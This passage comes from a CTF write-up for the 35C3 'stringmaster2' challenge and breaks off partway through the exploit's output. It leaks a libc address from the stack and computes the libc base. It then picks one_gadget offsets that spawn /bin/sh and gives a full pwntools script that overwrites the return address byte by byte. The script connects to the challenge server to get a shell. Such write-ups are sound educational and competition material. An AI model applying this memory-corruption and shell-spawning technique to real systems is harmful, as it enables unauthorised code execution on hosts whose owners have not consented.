0496| 0x7fffae528268 --> 0x556172d745fb (:     mov    eax,0x0)
```
Almost immediately after that, we have a LibC runtime address (or more accurately, 231 bytes from the start address of the function):
```
0512| 0x7fffae528278 --> 0x7f7b5c988b17 (:       mov    edi,eax)
```
In our local environment, LibC is located at `/lib/x86_64-linux-gnu/libc.so.6`:
```console
root@kali:/media/sf_CTFs/35c3ctf/stringmaster2# ldd ./stringmaster2
        linux-vdso.so.1 (0x00007ffccc303000)
        libstdc++.so.6 => /usr/lib/x86_64-linux-gnu/libstdc++.so.6 (0x00007ff234407000)
        libgcc_s.so.1 => /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007ff2343ed000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff234230000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007ff23409c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff2347a5000)
```
We can check the compile-time address with pwntools:
```python
>>> from pwn import *
>>> libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
>>> print hex(libc.symbols['__libc_start_main'])
0x22a30
```
So we can get the LibC runtime base address by performing:
```
0x7f7b5c988b17 - 231 - 0x22a30 = 0x7f7b5c966000
```
The address is 4K aligned so this looks correct.
Now we can use `one_gadget` to search for an address which will spawn us a shell:
```console
root@kali:/media/sf_CTFs/35c3ctf/stringmaster2# one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x4345e execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
0x434b2 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
0xe42ee execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
```
Our plan is to override the return address at offset 0x78 with libc_base + 0x4345e, and get a shell (of course, on the server, these addresses will be different).
The script:
```python
from pwn import *
import argparse
import os
import string
#context.log_level = "debug"
LOCAL_PATH = "./stringmaster2"
def get_process(is_remote = False):
    if is_remote:
        return remote("35.207.132.47", 22225)
    else:
        return process(LOCAL_PATH)
def get_libc_path(is_remote = False):
    if is_remote:
        return "./libc-2.27.so"
    else:
        return "/lib/x86_64-linux-gnu/libc.so.6"
def get_one_gadget(is_remote = False):
    if is_remote: 
        return 0x4f2c5
    else:
        return 0x4345e
def read_menu(proc):
    proc.recvuntil("\n> ")
def swap(proc, index1, index2):
    read_menu(proc)
    proc.sendline("swap")
    proc.sendline("{} {}".format(index1, index2))
    log.info("Swapping index {} and {}".format(index1, index2))
def replace(proc, char1, char2):
    read_menu(proc)
    proc.sendline("replace")
    proc.sendline("{} {}".format(char1, char2))
    log.info("Replacing '{}' and '{}'".format(char1, char2))
def print_info(proc):
    read_menu(proc)
    proc.sendline("print")
    return proc.recvuntil("\nEnter the command you want to execute:", drop = True)
def quit(proc):
    read_menu(proc)
    proc.sendline("quit")
    log.info("Quitting...")
parser = argparse.ArgumentParser()
parser.add_argument("-r", "--remote", help="Execute on remote server", action="store_true")
args = parser.parse_args()
e = ELF(LOCAL_PATH)
libc = ELF(get_libc_path(args.remote))
p = get_process(args.remote)
p.recvuntil("String1: ")
str1 = p.recvline()
p.recvuntil("String2: ")
str2 = p.recvline()
log.info("String 1: {}".format(str1))
log.info("String 2: {}".format(str2))
for x in string.ascii_lowercase:
    if x not in str1:
        missing_letter = x
        break
replace(p, x, x)
print "Before modification:"
stack = print_info(p)
print hexdump(stack)
base_index = 0x78
libc_start_main_base_index = 0x88
libc_start_main = u64(stack[libc_start_main_base_index:libc_start_main_base_index+8]) - 231
libc_base =  libc_start_main - libc.symbols["__libc_start_main"]
assert(libc_base & 0xFFF == 0)
log.info("libc_base: {}".format(hex(libc_base)))
libc.address = libc_base
one_gadget = libc_base + get_one_gadget(args.remote)
log.info("one_gadget address: {}".format(hex(one_gadget)))
for i, char in enumerate(p64(one_gadget)):
    replace(p, str1[0], char)
    swap(p, 0, base_index + i)
    str1 = print_info(p)[:len(str1)]
print "After modification:"
print hexdump(print_info(p))
quit(p)
p.interactive()
```
The output:
```console
root@kali:/media/sf_CTFs/35c3ctf/stringmaster2# python exploit.py -r
[*] '/media/sf_CTFs/35c3ctf/stringmaster2/stringmaster2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/media/sf_CTFs/35c3ctf/stringmaster2/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 35.207.132.47 on port 22225: Done
[*] String 1: fiwxkmqfdr
[*] String 2: akchuqvtth
[*] Replacing 'a' and 'a'
Before modification:
00000000  66 69 77 78  6b 6d 71 66  64 72 00 00  00 00 00 00  │fiwx│kmqf│dr··│····│
00000010  20 8d 60 bb  fd 7f 00 00  05 00 00 00  00 00 00 00  │ ·`·│····│····│····│
00000020  70 72 69 6e  74 00 65 00  71 26 71 dd  11 56 00 00  │prin│t·e·│q&q·│·V··│
00000030  00 00 00 00  00 00 00 00  00 be ae 7a  78 b2 1c 75  │····│····│···z│x··u│
00000040  02 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000050  90 26 71 dd  11 56 00 00  30 12 71 dd  11 56 00 00  │·&q·│·V··│0·q·│·V··│
00000060  60 8e 60 bb  fd 7f 00 00  00 00 00 00  00 00 00 00  │`·`·│····│····│····│
00000070  00 00 00 00  00 00 00 00  fb 25 71 dd  11 56 00 00  │····│····│·%q·│·V··│